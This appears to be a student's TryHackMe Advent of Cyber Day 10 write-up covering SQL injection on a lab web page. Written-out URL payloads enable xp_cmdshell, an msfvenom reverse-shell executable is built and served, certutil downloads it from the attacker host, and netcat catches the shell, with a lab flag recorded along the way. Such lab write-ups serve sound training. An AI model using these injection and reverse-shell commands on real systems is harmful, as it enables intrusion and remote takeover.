## Day 10
First we will visit the website given and after scrolling down we will find a button to 'start my gift search'. We will click it and a new page will appear. Also we will get the answer of our first question here.

![image](https://github.com/UselessAaka/TryHackMe-Advent-Of-Cyber/assets/148384618/39a96553-21f6-43a5-ab6e-2964cc7cd421)

### Flag
> /giftsearch.php

Now we will press search without filling anything and get a new url. We have to modify this by removing the word 'child' and inserting an apostrophe '10.10.157.3/giftresults.php?age='&budget=0'. This will tell us the ODBC driver being used.

![image](https://github.com/UselessAaka/TryHackMe-Advent-Of-Cyber/assets/148384618/8f05d4fb-c23c-4108-898c-c87dbb382b90)
![image](https://github.com/UselessAaka/TryHackMe-Advent-Of-Cyber/assets/148384618/f80639e9-b7e1-40e3-9f11-224bee270760)

### Flag
> ODBC Driver 17 for SQL Server

Now we have to use 1=1 injection so for that we will change the url to '10.10.157.3/giftresults.php?age=' OR 1=1 --' and get the list, but we have to tell the last data so we will scroll down to the very end and see the flag.

![image](https://github.com/UselessAaka/TryHackMe-Advent-Of-Cyber/assets/148384618/05b48fbb-a3c8-441a-9b4f-1d5c56b33f28)

### Flag
> THM (a4ffc901c27fb89efe3c31642ece4447}

Now we have to get access to the system. So for that first we will search the url 'http://10.10.157.3/giftresults.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --'.
Now for remote code execution we will go to the terminal and type ' msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.109 LPORT=4444 -f exe -o reverse.exe' and we will wait for it to create a payload and then we have to host it using 'python3 -m http.server 8000'

![image](https://github.com/UselessAaka/TryHackMe-Advent-Of-Cyber/assets/148384618/1e959dec-81cf-4961-baf6-a86be92f76d2)

Now we go back to the website and run 'http://10.10.157.3/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.14.109:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --' hit enter.
Now we open a new terminal and use command 'nc -lnvp 4444'  and go back to the website to run 'http://10.10.157.3/giftresults.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --' and now we are finally connected to the system on terminal.

![image](https://github.com/UselessAaka/TryHackMe-Advent-Of-Cyber/assets/148384618/a98c4b7b-dc60-47a1-b233-54ca4b9ae68a)

Now we will go to Users\Administrator\Desktop and see the note file and use type Note.txt to read it and get the password.

![image](https://github.com/UselessAaka/TryHackMe-Advent-Of-Cyber/assets/148384618/1fd0abdd-71b7-4a25-8718-e038010ec581)
![image](https://github.com/UselessAaka/TryHackMe-Advent-Of-Cyber/assets/148384618/75e4a343-3596-4926-96e3-d61d35d147b5)

Now we have to restore the website by using 'restore_website.bat'

![image](https://github.com/UselessAaka/TryHackMe-Advent-Of-Cyber/assets/148384618/4528ca0b-1600-4a89-899f-fe59d0a0e6da)

If we refresh the website we will get our flag.

![image](https://github.com/UselessAaka/TryHackMe-Advent-Of-Cyber/assets/148384618/0a14a643-3373-4436-bae3-4e9ecdfea6b6)



